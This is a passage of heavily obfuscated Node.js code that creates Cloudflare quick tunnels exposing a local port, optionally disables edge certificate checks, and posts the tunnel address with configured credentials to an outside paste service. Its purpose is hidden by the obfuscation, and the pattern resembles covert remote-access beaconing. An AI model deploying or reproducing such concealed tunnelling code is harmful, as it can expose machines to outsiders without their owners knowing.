                g['ok'] ? (this['log'][dE(0x6ea)](b[dE(0xc8)](b[dE(0x50f)], g['location'] || b['bjJhJ'])), this['connection'][dE(0x32d)] = !![]) : this[dE(0xb4)][dE(0x641)](b[dE(0x2b9)](b[dE(0x419)], g[dE(0x5e4)] || b['eEDvi']));
            } catch (h) {
                this[dE(0xb4)][dE(0x1cc)](b[dE(0x2b9)](b['bJQbz'], h));
            }
        }
    }
}
function a0ax(a) {
    const dF = a0aQ, b = {
            'QUFAd': dF(0x224),
            'uaKZU': function (c, d) {
                return c(d);
            },
            'xKRPO': function (c, d, f) {
                return c(d, f);
            },
            'tnbMB': function (c, d, f) {
                return c(d, f);
            },
            'WFpjq': dF(0x5e4),
            'WqWeP': dF(0x226),
            'zXuyo': dF(0x6c9),
            'niHMy': 'http:',
            'JlCRe': 'https:',
            'YbhDS': function (c, d) {
                return c === d;
            },
            'AnKsx': dF(0x669)
        };
    return new Promise((c, d) => {
        const dI = dF, f = {
                'RJuse': function (n, o, p) {
                    const dG = a0b;
                    return b[dG(0x69b)](n, o, p);
                },
                'laMfd': function (n, o, p) {
                    const dH = a0b;
                    return b[dH(0x422)](n, o, p);
                },
                'jykXc': b[dI(0x644)],
                'YrEXL': b[dI(0x19c)]
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            b[dI(0x3ca)](d, new Error(b['zXuyo']));
            return;
        }
        if (![
                b[dI(0x228)],
                b['JlCRe']
            ][dI(0x572)](g[dI(0x6fa)]) || !g['hostname']) {
            b['uaKZU'](d, new Error(b[dI(0xe7)]));
            return;
        }
        const h = b[dI(0x3bc)](g[dI(0x6fa)], b[dI(0x184)]), i = g[dI(0x2b8)] || (h ? 0x1bb : 0x50), j = a0i[dI(0x669)]({
                'host': g[dI(0x697)],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const dJ = dI, q = b[dJ(0xc2)]['split']('|');
                let r = 0x0;
                while (!![]) {
                    switch (q[r++]) {
                    case '0':
                        b[dJ(0x3ca)](o, p);
                        continue;
                    case '1':
                        j[dJ(0xd5)](dJ(0x5e4), m);
                        continue;
                    case '2':
                        if (k)
                            return;
                        continue;
                    case '3':
                        j[dJ(0x461)](0x0);
                        continue;
                    case '4':
                        k = !![];
                        continue;
                    }
                    break;
                }
            }, m = o => {
                !k && f['RJuse'](l, d, o);
            };
        j['on'](b[dI(0x644)], m), j['setTimeout'](0x7530, () => j[dI(0x605)](new Error('origin\x20connection\x20timeout'))), j['on'](b[dI(0x6ec)], () => {
            const dK = dI;
            if (!h) {
                f[dK(0x25e)](l, c, j);
                return;
            }
            const o = a0j[dK(0x669)]({
                'socket': j,
                'servername': g[dK(0x697)]
            });
            o['on'](f[dK(0x515)], p => {
                !k && f['RJuse'](l, d, p);
            }), o['on'](f['YrEXL'], () => {
                const dL = dK;
                f[dL(0x25e)](l, c, o);
            });
        });
    });
}
function a0ay(a) {
    const dM = a0aQ, b = {
            'EZCuf': function (d, f) {
                return d < f;
            },
            'hfbLJ': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b['EZCuf'](d, a[dM(0x4a3)][dM(0x4a5)]); d += 0x2) {
        c[dM(0x33a)]([
            a[dM(0x4a3)][d],
            a['rawHeaders'][b[dM(0x125)](d, 0x1)]
        ]);
    }
    return c;
}
function a0az(a, b, c, d, f) {
    const dN = a0aQ, g = {
            'copqS': function (h, i) {
                return h(i);
            },
            'XmLGJ': 'origin\x20must\x20be\x20an\x20http://\x20or\x20https://\x20URL',
            'pXIzF': dN(0x4be),
            'yigrH': dN(0xc7),
            'hgCry': function (h, i) {
                return h(i);
            },
            'mGWYY': function (h, i) {
                return h === i;
            },
            'uKgXX': function (h, i) {
                return h === i;
            },
            'IyaXI': dN(0x5f8),
            'QUGzX': dN(0x1fd),
            'gjwfN': function (h, i) {
                return h === i;
            },
            'TFgBR': dN(0x474),
            'WyhJm': 'Host',
            'DomZW': dN(0x243),
            'aAScO': function (h, i) {
                return h + i;
            },
            'RKekv': dN(0x5e4)
        };
    return new Promise((h, i) => {
        const dQ = dN, j = {
                'JLKNw': function (r, s) {
                    const dO = a0b;
                    return g[dO(0x521)](r, s);
                },
                'eJomL': function (r, s) {
                    const dP = a0b;
                    return g[dP(0x521)](r, s);
                }
            };
        let k;
        try {
            k = new URL(a);
        } catch (r) {
            g['copqS'](i, new Error(g['XmLGJ']));
            return;
        }
        if (![
                g['pXIzF'],
                g['yigrH']
            ][dQ(0x572)](k['protocol']) || !k[dQ(0x697)]) {
            g[dQ(0x3ed)](i, new Error(g[dQ(0x444)]));
            return;
        }
        const l = g['mGWYY'](k[dQ(0x6fa)], g[dQ(0x373)]), m = k[dQ(0x2b8)] || (l ? 0x1bb : 0x50), n = {};
        for (const [s, t] of d) {
            const u = s[dQ(0x2c1)]();
            if (g[dQ(0x32a)](u, g[dQ(0x24f)]) || g[dQ(0x32a)](u, g[dQ(0x469)]) || g[dQ(0x65b)](u, g[dQ(0x35d)]) || g[dQ(0x5db)](u, dQ(0x294)))
                continue;
            n[s] = t;
        }
        n[g[dQ(0x17e)]] = k[dQ(0x5f8)];
        f[dQ(0x4a5)] && (n[g['DomZW']] = String(f['length']));
        const o = c['startsWith']('/') ? c : g[dQ(0x197)]('/', c), p = l ? a0h : a0g, q = p['request']({
                'hostname': k[dQ(0x697)],
                'port': m,
                'path': o,
                'method': b,
                'headers': n,
                'timeout': 0x7530
            }, v => {
                const dR = dQ;
                j[dR(0x4b0)](h, {
                    'status': v[dR(0x51f)],
                    'headers': j[dR(0x67f)](a0ay, v),
                    'body': v
                });
            });
        q['on'](g[dQ(0x6a3)], v => i(v)), q['end'](f['length'] ? f : undefined);
    });
}
function a0aA(a) {
    const dS = a0aQ, b = {
            'BzzzR': dS(0x576),
            'jSdFm': 'error',
            'VQNbd': dS(0x4e5),
            'eWMLt': dS(0x63b),
            'ekHaG': dS(0x6bd),
            'ODGtG': function (c, d) {
                return c < d;
            },
            'gvkzT': function (c) {
                return c();
            },
            'dbxMb': dS(0x21e),
            'IQwPW': function (c, d, f) {
                return c(d, f);
            },
            'YzABo': function (c, d) {
                return c(d);
            },
            'flczF': function (c, d) {
                return c + d;
            },
            'LnLsb': function (c) {
                return c();
            },
            'ILXrz': function (c, d) {
                return c(d);
            }
        };
    return new Promise((c, d) => {
        const dX = dS;
        let f = Buffer['alloc'](0x0);
        const g = () => {
                const dT = a0b;
                a['removeListener'](b[dT(0x6c4)], h), a[dT(0xd5)](b[dT(0x443)], i), a['removeListener'](b['VQNbd'], j), a[dT(0xd5)](b['eWMLt'], j);
            }, h = k => {
                const dU = a0b;
                f = f['length'] ? Buffer['concat']([
                    f,
                    k
                ]) : k;
                const l = f[dU(0xfa)](b['ekHaG']);
                if (b[dU(0x20d)](l, 0x0))
                    return;
                b[dU(0x249)](g);
                const m = f[dU(0x2e4)](0x0, l)[dU(0x496)](b[dU(0x6e8)]), n = m[dU(0x316)]('\x0d\x0a'), o = n[0x0]['split']('\x20'), p = b[dU(0x119)](parseInt, o[0x1], 0xa);
                if (!Number[dU(0x634)](p)) {
                    d(new Error(dU(0x315)));
                    return;
                }
                const q = [];
                for (let r = 0x1; b[dU(0x20d)](r, n[dU(0x4a5)]); r++) {
                    const s = n[r];
                    if (!s)
                        continue;
                    const t = s[dU(0xfa)](':');
                    t > 0x0 && q[dU(0x33a)]([
                        s[dU(0x4a8)](0x0, t)[dU(0x5d6)](),
                        s[dU(0x4a8)](t + 0x1)[dU(0x5d6)]()
                    ]);
                }
                b[dU(0x3d3)](c, {
                    'status': p,
                    'headers': q,
                    'rest': f[dU(0x2e4)](b[dU(0x34a)](l, 0x4))
                });
            }, i = k => {
                const dV = a0b;
                b[dV(0x385)](g), d(k);
            }, j = () => {
                const dW = a0b;
                b['LnLsb'](g), b['ILXrz'](d, new Error(dW(0x39b)));
            };
        a['on']('data', h), a['on'](b[dX(0x443)], i), a['on'](dX(0x4e5), j), a['on'](b['eWMLt'], j);
    });
}
function a0aB(a) {
    const dY = a0aQ, b = {
            'ZDEPN': dY(0x2fc),
            'dxPey': dY(0x4db),
            'jHGLu': function (f, g) {
                return f === g;
            },
            'GAWlw': dY(0x231),
            'PgAEy': dY(0x4d2),
            'QtLku': function (f, g) {
                return f !== g;
            },
            'pkpVy': dY(0xdf),
            'SNsOp': function (f, g) {
                return f + g;
            },
            'RlNiv': 'issuer\x20OU\x20mismatch:\x20',
            'hTlss': dY(0x1c5),
            'prIoV': 'subject\x20CN\x20mismatch',
            'CbcdC': dY(0x3cc)
        };
    if (!a || !a['issuer'])
        return b[dY(0x60d)];
    if (b[dY(0x6cf)](a[dY(0x12d)]['O'], dY(0x6f0)))
        return 'issuer\x20O\x20mismatch:\x20' + (a['issuer']['O'] || '');
    if (!String(a[dY(0x12d)]['OU'] || '')['startsWith'](b[dY(0x37f)]))
        return b[dY(0x16f)](b['RlNiv'], a['issuer']['OU'] || '');
    if (!a[dY(0x381)] || a[dY(0x381)]['CN'] !== b[dY(0xed)])
        return b[dY(0x39e)];
    const c = String(a[dY(0x548)] || '')[dY(0x316)](',')['map'](f => f[dY(0x5d6)]()[dY(0x2c1)]()), d = c[dY(0x237)](f => {
            const dZ = dY;
            if (!f['startsWith'](b['ZDEPN']))
                return ![];
            const g = f[dZ(0x4a8)](0x4);
            return g === b['dxPey'] || b[dZ(0x225)](g, b['GAWlw']) || g[dZ(0x562)]('*.') && b['dxPey'][dZ(0x642)](g['slice'](0x1));
        });
    if (!d)
        return b['CbcdC'];
    return null;
}
function a0aC(a, b) {
    const e0 = a0aQ, c = {
            'dDIiH': e0(0x4db),
            'iKoGs': e0(0x5e4),
            'ccsDr': function (h, i) {
                return h(i);
            },
            'JOBLv': function (h, i) {
                return h !== i;
            },
            'PLbJK': function (h, i) {
                return h + i;
            },
            'eyTER': 'connected\x20to\x20',
            'iHdnf': function (h, i) {
                return h + i;
            },
            'LKVMo': e0(0x267),
            'WZocI': e0(0x58d)
        }, d = a0Z[e0(0x4a8)]()[e0(0x6d6)](() => Math[e0(0x2f3)]() - 0.5);
    let f = null;
    const g = async () => {
        const e3 = e0, h = {
                'MkNCz': function (i, j) {
                    return c['ccsDr'](i, j);
                },
                'lsVTb': function (i, j) {
                    return i + j;
                },
                'PScyn': function (i, j) {
                    const e1 = a0b;
                    return c[e1(0x736)](i, j);
                },
                'zbHVT': function (i, j) {
                    const e2 = a0b;
                    return c[e2(0x15b)](i, j);
                },
                'GCoHV': c[e3(0x143)],
                'haeNk': function (i, j) {
                    const e4 = e3;
                    return c[e4(0x240)](i, j);
                }
            };
        for (const i of d) {
            try {
                return await new Promise((j, k) => {
                    const e5 = e3, l = a0j['connect']({
                            'host': i,
                            'port': a0a0,
                            'ALPNProtocols': ['h2'],
                            'servername': c['dDIiH'],
                            'rejectUnauthorized': ![]
                        });
                    l[e5(0x461)](0x2710, () => l[e5(0x605)](new Error(e5(0x4ef)))), l['on'](c[e5(0x5f2)], k), l['on']('secureConnect', () => {
                        const e6 = e5;
                        if (a) {
                            const n = h[e6(0x207)](a0aB, l[e6(0x2c3)](![]));
                            if (n) {
                                l['destroy'](new Error(h['lsVTb']('edge\x20certificate\x20verification\x20failed:\x20', n)));
                                return;
                            }
                        }
                        const m = l[e6(0x27a)];
                        if (m && h[e6(0x497)](m, 'h2')) {
                            l[e6(0x605)](new Error(e6(0x1d0)));
                            return;
                        }
                        l[e6(0x461)](0x0), b[e6(0x6ea)](h[e6(0x1d1)](h[e6(0x1d1)](h[e6(0x631)], i) + ':', a0a0)), h['haeNk'](j, l);
                    });
                });
            } catch (j) {
                f = j, b[e3(0x641)](c['iHdnf'](e3(0x56a) + i + c[e3(0x692)], j));
            }
        }
        throw new Error(c['iHdnf'](c[e3(0x682)], f));
    };
    return g();
}
const a0aD = 0x2;
function a0aE(a) {
    const e7 = a0aQ, b = {
            'iFmBz': function (c, d) {
                return c === d;
            },
            'JOCUC': e7(0x33e),
            'qTfIo': function (c, d) {
                return c === d;
            },
            'XUdtz': e7(0x42b)
        };
    if (b[e7(0x154)](typeof a, b[e7(0x513)])) {
        const c = a[e7(0x5d6)]();
        if (c)
            try {
                return JSON[e7(0x4b2)](c);
            } catch (d) {
            }
        return {};
    }
    return a && b['qTfIo'](typeof a, b[e7(0x6b8)]) ? a : {};
}
class a0aF {
    constructor(a) {
        this['log'] = a, this['tunnels'] = new Map();
    }
    async [a0aQ(0x353)](a, b) {
        const e8 = a0aQ, c = {
                'kfBwP': function (l, m) {
                    return l > m;
                },
                'XJjXH': function (l, m) {
                    return l(m);
                },
                'RXqQQ': function (l, m) {
                    return l + m;
                },
                'nFxyH': e8(0x306),
                'XHApB': function (l, m) {
                    return l + m;
                },
                'PMoiv': 'argo\x20tunnel\x20created:\x20',
                'DzPMM': e8(0x574)
            }, d = this[e8(0x74c)]['get'](a) || [];
        if (c[e8(0x57d)](d['length'], 0x0) && !b) {
            const l = new Error(e8(0x478) + a + e8(0xad));
            l[e8(0x261)] = 0x199, l[e8(0x2b8)] = a;
            throw l;
        }
        let f, g, h, i;
        try {
            [f, g, h, i] = await c[e8(0x32b)](a0ar, 'https://api.trycloudflare.com');
        } catch (m) {
            const n = new Error(c['RXqQQ'](e8(0x60a), m[e8(0x322)]));
            n[e8(0x261)] = 0x1f4, n[e8(0x2b8)] = a;
            throw n;
        }
        const j = f['startsWith'](c['nFxyH']) ? f : c[e8(0x6e0)] + f, k = {
                'tunnelDomain': j,
                'port': a,
                'createdAt': new Date()[e8(0x4f9)]()[e8(0x4c2)](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'runPromise': null
            };
        return k[e8(0x12e)] = this[e8(0x441)](k, g, h, i)[e8(0x6af)](o => this['log'][e8(0x641)](e8(0x715) + j + e8(0x772) + o[e8(0x322)])), d['push'](k), this[e8(0x74c)][e8(0x5de)](a, d), this[e8(0xb4)][e8(0x6ea)](c['RXqQQ'](c['RXqQQ'](c[e8(0x31b)](c[e8(0x266)], j), c[e8(0x2bc)]), a)), k;
    }
    [a0aQ(0x2f8)]() {
        const e9 = a0aQ, a = [], b = [...this[e9(0x74c)][e9(0x236)]()][e9(0x6d6)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this['tunnels'][e9(0x514)](c)) {
                a[e9(0x33a)]({
                    'tunnel_domain': d[e9(0x57c)],
                    'port': d[e9(0x2b8)],
                    'created_at': d[e9(0x6ac)]
                });
            }
        }
        return a;
    }
    async [a0aQ(0x103)](a, b) {
        const ea = a0aQ, c = {
                'AXOYB': function (i, j) {
                    return i === j;
                },
                'cGSwu': function (i, j) {
                    return i > j;
                },
                'eNkdY': function (i, j) {
                    return i + j;
                }
            }, d = this[ea(0x74c)][ea(0x514)](a) || [];
        if (c['AXOYB'](d[ea(0x4a5)], 0x0))
            return {
                'status': 0x194,
                'message': ea(0x149) + a
            };
        let f;
        if (c[ea(0x2cb)](b, undefined) || b === null || c[ea(0x2cb)](b, '')) {
            if (c[ea(0x59a)](d[ea(0x4a5)], 0x1))
                return {
                    'status': 0x199,
                    'message': ea(0x48c) + a + ea(0x6ba)
                };
            f = d;
        } else {
            f = d[ea(0x72f)](i => i[ea(0x57c)] === b);
            if (f['length'] === 0x0)
                return {
                    'status': 0x194,
                    'message': ea(0x149) + a + ea(0x1da) + b
                };
        }
        const g = [];
        for (const i of f) {
            i['stopped'] = !![];
            if (i[ea(0x25c)] !== null)
                try {
                    i[ea(0x25c)][ea(0x605)]();
                } catch (j) {
                }
            await i[ea(0x12e)]['catch'](() => {
            }), g[ea(0x33a)]({
                'tunnel_domain': i[ea(0x57c)],
                'port': i[ea(0x2b8)],
                'created_at': i[ea(0x6ac)]
            });
        }
        const h = d[ea(0x72f)](k => !k[ea(0x3a6)]);
        h[ea(0x4a5)] > 0x0 ? this[ea(0x74c)]['set'](a, h) : this[ea(0x74c)][ea(0x49d)](a);
        for (const k of g) {
            this[ea(0xb4)]['info'](c[ea(0x494)](ea(0x2ca), k[ea(0x544)]));
        }
        return {
            'status': 'ok',
            'deleted': g['length'],
            'tunnels': g
        };
    }
    async [a0aQ(0x441)](a, b, c, d) {
        const eb = a0aQ, f = {
                'qtPvP': function (h, i) {
                    return h + i;
                },
                'ExvxC': eb(0x490),
                'AKzJR': function (h, i) {
                    return h !== i;
                },
                'iWDaV': function (h, i) {
                    return h(i);
                },
                'LAIBq': 'true',
                'YRxSb': function (h, i, j) {
                    return h(i, j);
                },
                'bYtUs': function (h, i) {
                    return h + i;
                },
                'LCMFN': function (h, i) {
                    return h + i;
                },
                'pSWun': eb(0x300),
                'vAeZz': '\x20connection\x20closed:\x20'
            }, g = f[eb(0x3b1)](f[eb(0x1e1)], a[eb(0x2b8)]);
        while (!a['stopped']) {
            let h = null;
            try {
                const i = f[eb(0x69a)](f[eb(0x1ce)](String, process.env.KISAMA_EDGE_INSECURE || '')[eb(0x2c1)](), f[eb(0xae)]);
                h = await f['YRxSb'](a0aC, i, this[eb(0xb4)]);
                if (a[eb(0x3a6)]) {
                    try {
                        h[eb(0x605)]();
                    } catch (j) {
                    }
                    break;
                }
                a[eb(0x25c)] = h, await new a0au(h, g, b, c, d, 0x0, this[eb(0xb4)], a['tunnelDomain'], ![], { 'printed': !![] })[eb(0x524)]();
            } catch (k) {
                !a[eb(0x3a6)] && this[eb(0xb4)][eb(0x641)](f[eb(0x17a)](f[eb(0x17a)](f[eb(0x606)](f[eb(0x543)], a[eb(0x57c)]), f[eb(0x1dd)]), k[eb(0x322)]));
            } finally {
                if (f[eb(0x69a)](h, null))
                    try {
                        h[eb(0x605)]();
                    } catch (l) {
                    }
                a[eb(0x25c)] = null;
            }
            !a[eb(0x3a6)] && await new Promise(m => setTimeout(m, a0aD * 0x3e8));
        }
    }
}
class a0aG {
    static [a0aQ(0x70e)] = ![];
    static ['_domain'] = null;
    static ['_SHZAL_NAME_CHARS'] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static [a0aQ(0x2da)] = ![];
    static [a0aQ(0x5dc)]() {
        const ec = a0aQ, a = {
                'tbTbW': function (g, h) {
                    return g < h;
                },
                'GecBv': ec(0x397),
                'LAgMm': ec(0x1d9),
                'jbOOG': ec(0x3a4),
                'XBDAi': ec(0x185),
                'XWdvY': ec(0x4e3)
            }, b = a0O['KNAME'] || '', c = a0O[ec(0x1d9)] || a0O[ec(0x18f)] || '', d = [];
        if (a[ec(0x288)](b[ec(0x4a5)], 0x3))
            d[ec(0x33a)](ec(0xde) + b[ec(0x4a5)] + ec(0x517));
        if (!this[ec(0x49c)]['test'](b))
            d[ec(0x33a)](a[ec(0x4e6)]);
        if (c[ec(0x4a5)] < 0x8)
            d[ec(0x33a)](ec(0x5a2) + c[ec(0x4a5)] + ec(0xce) + (a0O[ec(0x1d9)] ? a[ec(0x695)] : ec(0x18f)) + ')');
        const f = d[ec(0x4a5)] === 0x0;
        return !f && !this[ec(0x2da)] && (this[ec(0x2da)] = !![], a0C[ec(0x6ea)](ec(0xbc) + d[ec(0x211)](';\x20') + ec(0x6a0) + (b || a[ec(0x6cb)]) + ec(0x587) + (a0O[ec(0x1d9)] || a['XBDAi']) + ')'), a0C[ec(0x6ea)](a[ec(0x74e)])), f;
    }
    static [a0aQ(0x22c)]() {
        const ed = a0aQ, a = {
                'AMLNq': function (b, c) {
                    return b === c;
                },
                'tBhJD': ed(0x11d)
            };
        return a0O['DEBUG'] || a[ed(0x33f)](String(process.env.SHZAL_DEBUG || '')[ed(0x2c1)](), a['tBhJD']);
    }
    static [a0aQ(0x3f0)](a) {
        const ee = a0aQ, b = {
                'MndOF': function (f, g) {
                    return f + g;
                },
                'otWxF': ee(0x3df),
                'WHPIw': function (f, g) {
                    return f(g);
                },
                'gArOI': function (f, g) {
                    return f + g;
                },
                'AqOHB': ee(0x741),
                'WsRYw': 'POST\x20https://shz.al/\x20状态:\x20',
                'IWgbF': function (f, g) {
                    return f === g;
                },
                'iyArX': ee(0x23f),
                'LLTtG': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'yxgdw': ee(0x6a7),
                'NlkkY': function (f, g) {
                    return f === g;
                },
                'yjqQp': ee(0x36d),
                'dLimv': function (f) {
                    return f();
                },
                'fSJfU': function (f, g) {
                    return f(g);
                },
                'xSEgi': function (f, g) {
                    return f + g;
                },
                'yzxJV': ee(0x420),
                'jtABA': ee(0x74a),
                'dCtwK': function (f) {
                    return f();
                },
                'ayMKi': function (f, g) {
                    return f(g);
                },
                'pFput': ee(0x38b),
                'zUppt': ee(0x29c),
                'bxGNa': 'error',
                'nTozb': function (f, g) {
                    return f + g;
                },
                'Zxmiv': ee(0x48a),
                'SksKF': function (f, g) {
                    return f + g;
                },
                'xTLli': function (f, g) {
                    return f + g;
                },
                'jlgjW': ee(0x4c1),
                'YJKCH': ee(0x401),
                'yzKtN': function (f, g) {
                    return f > g;
                },
                'rfYGc': function (f, g) {
                    return f(g);
                },
                'uwYyL': 'POST',
                'MdHWP': function (f, g) {
                    return f(g);
                },
                'dXfpz': '上报异常:\x20'
            }, c = this[ee(0x22c)](), d = f => {
                const ef = ee;
                if (c)
                    a0C[ef(0x1cc)](b['MndOF'](b[ef(0x13c)], f));
            };
        return new Promise(f => {
            const eh = ee, g = {
                    'cQjFF': function (n, o) {
                        const eg = a0b;
                        return b[eg(0xb7)](n, o);
                    },
                    'ZoCmr': function (n, o) {
                        return n + o;
                    },
                    'siple': b[eh(0x452)],
                    'zlBNm': b[eh(0x707)],
                    'UFuYc': b[eh(0x208)]
                }, h = a0O[eh(0x18f)], i = a0O[eh(0x1d9)] || a0O[eh(0x18f)], j = b['nTozb'](eh(0x5a9), a0k[eh(0x36f)](0xc)[eh(0x496)](b['Zxmiv'])), k = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        h
                    ],
                    [
                        's',
                        i
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], l = n => {
                    const ei = eh, o = n[ei(0x4a1)](([p, q]) => Buffer[ei(0x3e1)]('--' + j + ei(0x204) + p + ei(0x138) + q + '\x0d\x0a'));
                    return o[ei(0x33a)](Buffer[ei(0x3e1)]('--' + j + ei(0x1b3))), Buffer[ei(0x147)](o);
                }, m = (n, o, p, q) => {
                    const ej = eh, r = {
                            'oVDEf': ej(0x4e5),
                            'CLotT': function (v, w) {
                                return g['cQjFF'](v, w);
                            },
                            'uakLm': function (v, w) {
                                const ek = ej;
                                return g[ek(0x1ed)](v, w);
                            },
                            'mlHWP': function (v, w) {
                                return g['ZoCmr'](v, w);
                            },
                            'HEnWP': g[ej(0x748)],
                            'gjRJh': function (v, w) {
                                const el = ej;
                                return g[el(0x10a)](v, w);
                            }
                        }, s = new URL(n), t = a0h['request']({
                            'hostname': s[ej(0x697)],
                            'port': s[ej(0x2b8)] || 0x1bb,
                            'path': g['ZoCmr'](s[ej(0xd9)], s[ej(0x163)]),
                            'method': p,
                            'headers': {
                                'Content-Type': 'multipart/form-data;\x20boundary=' + j,
                                'Content-Length': o ? o[ej(0x4a5)] : 0x0,
                                'User-Agent': g[ej(0x383)]
                            }
                        }, v => {
                            const em = ej;
                            v[em(0x57a)](), v['on'](r[em(0x270)], () => q(v[em(0x51f)]));
                        });
                    t['on'](g[ej(0x5ed)], v => {
                        const en = ej;
                        r[en(0x752)](d, r[en(0x2ad)](r[en(0x5b5)](r['uakLm'](r['uakLm'](p, '\x20'), n), r['HEnWP']), v['message'])), r[en(0x364)](q, 0x0);
                    });
                    if (o)
                        t[ej(0x1f8)](o);
                    t[ej(0x4e5)]();
                };
            d(b[eh(0x13a)](b[eh(0x2a7)](b[eh(0x12b)](b['jlgjW'] + h, b[eh(0x2b7)]), b[eh(0x1ca)](i[eh(0x4a5)], 0x0)), ')'));
            try {
                m(eh(0x713), b[eh(0x700)](l, k), b[eh(0x48f)], n => {
                    const eq = eh, o = {
                            'YOuoH': function (p, q) {
                                const eo = a0b;
                                return b[eo(0x446)](p, q);
                            },
                            'XZkky': function (p, q) {
                                const ep = a0b;
                                return b[ep(0x63e)](p, q);
                            },
                            'SgFCd': b[eq(0x3bb)],
                            'tHWzl': function (p) {
                                return p();
                            }
                        };
                    d(b[eq(0x2e9)](b[eq(0x4f7)], n));
                    if (b[eq(0xf7)](n, 0x199)) {
                        b[eq(0x446)](d, b['gArOI'](b['iyArX'] + h, ':*'));
                        const p = k[eq(0x72f)](([q]) => q !== 'n');
                        b[eq(0x537)](m, 'https://shz.al/~' + h + ':' + i, b[eq(0x446)](l, p), b[eq(0x1b0)], q => {
                            const er = eq;
                            o[er(0x16b)](d, o[er(0x10e)](er(0x464), q) + (q === 0xc8 ? er(0x46f) : o[er(0x75e)])), o[er(0x11f)](f);
                        });
                    } else
                        b[eq(0x34f)](n, 0xc8) ? (b[eq(0x446)](d, b[eq(0x6c1)]), b[eq(0x14c)](f)) : (b[eq(0x257)](d, b[eq(0x4c8)](b['MndOF'](b[eq(0x4cd)], n), b[eq(0x387)])), b[eq(0x421)](f));
                });
            } catch (n) {
                b['MdHWP'](d, b['gArOI'](b[eh(0x5bc)], n[eh(0x322)])), b[eh(0x14c)](f);
            }
        })[ee(0x734)](() => {
            this['_domain'] = a;
        })['catch'](() => {
        });
    }
    static [a0aQ(0x395)]() {
        const es = a0aQ, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l[es(0x124)](b) && a0l[es(0x1a2)](b)[es(0x479)]())
                return b;
        }
        try {
            return a0o['homedir']();
        } catch (c) {
            return process[es(0x2f7)]();
        }
    }
    static [a0aQ(0x30b)]() {
        const et = a0aQ, a = {
                'PUqUx': et(0x4bb),
                'bdSUK': function (c, d) {
                    return c > d;
                }
            };
        let b = (a0O[et(0x1c6)] || '')[et(0x5d6)]();
        if (!b)
            return a0n[et(0x211)](this['homeDir'](), et(0x3f4));
        if (b['startsWith'](a[et(0x583)]))
            b = a[et(0x463)](b['length'], 0x5) ? a0n[et(0x211)](this[et(0x395)](), b['slice'](0x5)[et(0x4c2)](/^[/\\]+/, '')) : this['homeDir']();
        else
            b[et(0x562)]('~') && (b = a0n[et(0xd7)](b[et(0x4c2)](/^~(?=[/\\]|$)/, this[et(0x395)]())));
        return b;
    }
    static ['writeDomainFile'](a) {
        const eu = a0aQ;
        this[eu(0x5e0)] = a;
        const b = this[eu(0x30b)]();
        try {
            a0l[eu(0x4e2)](a0n[eu(0x2b2)](a0n[eu(0xd7)](b)), { 'recursive': !![] }), a0l[eu(0xb1)](b, a), a0C[eu(0x6ea)](eu(0x2fb) + b);
        } catch (c) {
            a0C[eu(0x165)](eu(0x323) + b + eu(0x3e2) + c['message']);
        }
    }
    static ['deleteDomainFile']() {
        const ev = a0aQ, a = this['resolveDomainFilePath']();
        try {
            a0l[ev(0x124)](a) && a0l[ev(0x1a2)](a)[ev(0x4d5)]() && (a0l[ev(0x5c3)](a), a0C[ev(0x6ea)](ev(0x65a) + a));
        } catch (b) {
            a0C[ev(0x165)](ev(0x358) + a + ev(0x3e2) + b[ev(0x322)]);
        }
    }
    static ['onBaseinfoSuccess']() {
        const ew = a0aQ;
        !this[ew(0x70e)] && (this[ew(0x70e)] = !![], this[ew(0x2b0)]());
    }
    static [a0aQ(0x434)]() {
        const ex = a0aQ, a = {
                'IoAgv': function (b, c) {
                    return b === c;
                },
                'BiFcp': '[KMODE]\x20tunnel\x20domain\x20not\x20ready',
                'cfsYS': ex(0x63b),
                'lHrXq': ex(0x5e4)
            };
        try {
            const b = a0p['createInterface']({
                'input': process[ex(0x5ab)],
                'terminal': ![]
            });
            b['on'](ex(0x5ee), c => {
                const ey = ex;
                a[ey(0x5f0)](c[ey(0x5d6)](), ey(0x71a)) && console[ey(0xb4)](this[ey(0x5e0)] || a[ey(0x733)]);
            }), b['on'](a[ex(0xb0)], () => {
            }), b['on'](a[ex(0x52f)], () => {
            });
        } catch (c) {
        }
    }
    static ['activate'](a) {
        const ez = a0aQ, b = {
                'jOBXS': function (c, d) {
                    return c === d;
                },
                'uagqE': ez(0x186)
            };
        if (b[ez(0x3b7)](a0O[ez(0x3f5)], '2') && this[ez(0x5dc)]()) {
            a0C['info'](ez(0xba)), a[ez(0x353)](a0O['PORT'])['then'](c => this['reportShzal'](c['tunnelDomain']))['catch'](() => {
            });
            return;
        }
        a0C[ez(0x6ea)](b[ez(0x45a)]), a['create'](a0O[ez(0x2a2)])[ez(0x734)](c => {
            const eA = ez;
            this[eA(0xd0)](c[eA(0x57c)]);
        })[ez(0x6af)](c => {
            const eB = ez;
            a0C[eB(0x165)]('[KMODE]\x20⚠️\x20启动隧道创建失败:\x20' + c[eB(0x322)]);
        }), this[ez(0x434)]();
    }
}
let a0aH = null, a0aI = null;
const a0aJ = new Promise((a, b) => {
    const eC = a0aQ, c = {
            'awvUa': eC(0x746),
            'oBzYl': eC(0x68d),
            'EhZpA': eC(0x4fc),
            'BkXBg': function (d) {
                return d();
            },
            'qkTmd': function (d, f) {
                return d(f);
            },
            'KIlPe': '[WARN]\x20Exception\x20loading\x20Noise\x20module:',
            'tryWU': function (d) {
                return d();
            }
        };
    try {
        c[eC(0x30e)](a0x, function (d) {
            const eD = eC;
            if (!d) {
                a0aI = new Error(c[eD(0x584)]), a0C[eD(0x165)](c['oBzYl'], a0aI[eD(0x322)]), a();
                return;
            }
            a0aH = d, a0C[eD(0x1cc)](c['EhZpA']), c[eD(0x1b6)](a);
        });
    } catch (d) {
        a0aI = d, a0C[eC(0x165)](c[eC(0x567)], d['message']), c[eC(0x57b)](a);
    }
});
process['on'](a0aQ(0x52e), (a, b) => {
    const eE = a0aQ;
    a0C['error'](eE(0x312), a);
}), process['on'](a0aQ(0x435), a => {
